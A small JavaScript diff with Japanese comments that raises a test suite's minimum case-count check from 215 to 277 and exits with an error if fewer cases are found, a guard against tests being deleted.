-if (cases.length < 215) {
+// 2026-10-08: §19 を足して 277 件、§6 に 5 件を足して 282 件なので下限 277。
+if (cases.length < 277) {
   console.log(
-    `\n${cases.length} 件しかケースが無い（215 未満）。テストが削られていないか確認すること。`
+    `\n${cases.length} 件しかケースが無い（277 未満）。テストが削られていないか確認すること。`
   );
   process.exit(1);
 }
